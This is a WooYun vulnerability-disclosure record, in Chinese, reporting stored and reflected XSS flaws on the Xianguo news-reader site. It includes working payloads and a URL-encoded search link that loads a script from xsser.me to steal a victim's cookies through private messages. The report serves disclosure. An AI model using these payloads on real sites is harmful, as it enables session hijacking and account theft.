{"id": 15111, "wybug_id": "wooyun-2013-017129", "wybug_title": "鲜果网各种xss，piapia的弹呀", "wybug_corp": "鲜果网", "wybug_author": "se55i0n", "wybug_date": "2013-01-11 16:18", "wybug_open_date": "2013-01-16 16:19", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 听说你们要发礼物，奔着你们礼物来的，HOHO~ 详细说明：  1）存储型xss，这个危害你们懂的；  1.1）发布功能处存储型xss；     标题处过滤的很好，但是文本内容却忽略了<img>标签的过滤，所有发布功能文本均可插入xss code,如我们在文本内容中插入以下内容;\ntest<img src=0 onerror=alert(/3/)>\n \n\n  1.2)标签设置处存储型xss；      此处其实鲜果的同学是做了防御的，无法输入\"<\"；好吧，你不让输入，我就复制粘贴吧；将我们准备好的xss code直接复制过去，经过一番尝试，发现<script>标签只能弹一次便被过滤，<img>标签下的xss code则能静静躺在那里等待促发； \n\n2）反射型xss   2.1）搜索功能处xss；     来到搜索功能处，首先输入“\">”进行试探，发现直接测漏鸟； \n\n    好吧，这就好办多了，直接构造以下代码：\n\"><script>alert(document.cookie)</script><input\n进行测试； \n\n   2.2)反馈功能处DOM+反射型xss；     点击意见反馈，我们注意到页面的特征，url里的tags内容正好与标签内容对应；\n\n     好吧，打开浏览器调试查看一番，然后直接在tags内容后插入xss code; \n<script>alert(/2/)</script>\n     提交url请求后，直接弹出窗口； \n\n   2.3）阅读器功能函数构造反射xss；     来到阅读器的功能页面，发现如下url：\nhttp://xianguo.com/reader#PageMgr.goIndexPage()\n     url里直接引用了一个函数，这里可不可以利用下呢，构造以下链接直接提交；\nhttp://xianguo.com/reader#PageMgr.goIndexPage(alert(/xss/))\n     pia的一声，又弹出一个串口；\n\n3）利用反射型xss盗取用户cookie；   3.1）不要小看了反射型xss，一定条件下也能利用起来的；   3.2）鲜果网有个站内短信功能，不知道能不能将这个功能和反射性xss结合起来发挥作用呢，将以下反射性xss的链接直接发给用户B；\nhttp://xianguo.com/search?searchType=all&keyword=%22%3E%3C%73%63%72%69%70%74%2F%73%72%63%3D%68%74%74%70%3A%2F%2F%78%73%73%65%72%2E%6D%65%2F%57%36%58%5A%50%78%3F%31%33%35%33%30%37%33%33%32%34%3E%3C%2F%73%63%72%69%70%74%3E\n   3.3）登陆用户B查看短信息，发现鲜果的同学未对链接中的敏感字符进行一些处理，而是直接原样传递给用户B； \n\n   3.4）如果不知情的用户，访问了我们发送的链接，那么...\n\n    漏洞证明：  见详细说明~   修复方案：  写了这么多，求礼物呀！   版权声明：转载请注明来源 se55i0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-01-16 16:19 厂商回复：  最新状态： 2013-01-16：忘记认领了，抱歉，我们及时处理。感谢：）  ", "replys": "漏洞评价：\n评论\n     2013-01-16 16:22 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  悲剧啊，刚好过期公开啊！    \n     2013-01-16 16:28 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @风萧萧 session要哭了~    \n     2013-01-17 06:57 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @小胖子 @风萧萧   擦，鲜果的同学不讲究呀……    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}